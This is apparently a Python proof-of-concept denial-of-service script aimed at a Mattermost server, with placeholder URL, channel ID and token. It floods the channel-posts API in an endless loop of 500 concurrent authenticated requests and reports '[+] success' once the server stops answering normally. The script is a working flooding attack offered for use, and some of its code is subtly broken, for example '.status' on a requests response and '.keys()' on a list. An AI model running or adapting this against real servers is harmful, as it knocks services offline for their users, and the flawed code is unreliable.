#!/usr/bin/env python3

import asyncio
import sys

import aiohttp
from requests import get

URL = "https://mattermost.example.invalid"
CHANNEL_ID = "example-channel-id"
TOKEN = "example-mmauthtoken"


async def get_posts(session, channel_id):
    async with session.get(URL + f"/api/v4/channels/{channel_id}/posts") as response:
        if not response.ok and response.status != 429:
            print("[+] success")
            sys.exit(0)
        posts = await response.json()
        return posts.get("posts", [])


async def main():
    response = get(
        URL + "/api/v4/system/ping",
        headers={"Content-Type": "application/json"},
    )
    if not response.ok and response.status != 429:
        print("[+] success")
        sys.exit(0)
    async with aiohttp.ClientSession(
        headers={"Authorization": f"Bearer {TOKEN}"},
    ) as session:
        posts = await get_posts(session, CHANNEL_ID)
        posts = list(posts.keys())

        while True:
            tasks = [get_posts(session, CHANNEL_ID) for _ in range(500)]
            print("[+] gathering posts")
            posts = await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(main())
